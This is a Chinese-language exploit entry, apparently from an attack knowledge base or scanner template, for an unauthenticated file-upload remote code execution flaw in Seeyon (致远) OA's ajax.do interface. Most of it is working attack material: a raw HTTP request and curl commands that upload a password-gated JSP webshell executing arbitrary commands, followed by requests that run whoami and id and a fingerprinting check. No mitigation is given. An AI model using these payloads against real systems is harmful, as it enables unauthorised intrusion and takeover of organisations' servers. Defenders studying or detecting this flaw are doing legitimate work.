---
id: SEEYON-AJAX-UPLOAD-RCE
title: 致远OA ajax.do 未授权文件上传 RCE
product: seeyon-oa
vendor: 北京致远互联
version_affected: "V5, V8.0SP2, V8.1, A6, A8"
severity: CRITICAL
tags: [rce, file_upload, 无需认证, 国产, oa]
fingerprint: ["致远", "Seeyon", "/seeyon/", "ajax.do"]
---

## 漏洞描述

致远OA多个版本的ajax.do接口存在未授权文件上传漏洞，可上传JSP webshell实现远程代码执行。

## 影响版本

- 致远OA V5
- 致远OA V8.0SP2, V8.1
- 致远OA A6, A8

## 前置条件

- 目标运行致远OA 且可通过网络访问
- `/seeyon/ajax.do` 接口未做访问限制
- 无需认证

## 利用步骤

### Step 1: 上传webshell

```http
POST /seeyon/ajax.do?method=ajaxAction&managerName=porabortalManager&rnd=123 HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file1"; filename="test.jsp"
Content-Type: application/octet-stream

<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>
<%if(request.getParameter("pwd").equals("test")){out.print("ok");}%>
------WebKitFormBoundary--
```

### Step 2: 执行命令

```http
GET /seeyon/test.jsp?pwd=test&cmd=whoami HTTP/1.1
Host: target
```

## Payload

### 上传 webshell

```bash
curl -X POST "http://target/seeyon/ajax.do?method=ajaxAction&managerName=porabortalManager&rnd=123" \
  -F 'file1=@-;filename=test.jsp;type=application/octet-stream' <<< '<%if(request.getParameter("pwd").equals("test")){out.print(Runtime.getRuntime().exec(request.getParameter("cmd")));}%>'
```

### 执行命令

```bash
curl -s "http://target/seeyon/test.jsp?pwd=test&cmd=whoami"
```

## 验证方法

- 上传请求返回 HTTP 200 即文件上传可能成功
- 访问上传的 JSP 文件并传入命令参数，响应中包含命令执行结果即确认 RCE

```bash
curl -s "http://target/seeyon/test.jsp?pwd=test&cmd=id"
```

## 指纹确认

```bash
curl -s -o /dev/null -w "%{http_code}" "http://target/seeyon/ajax.do"
```
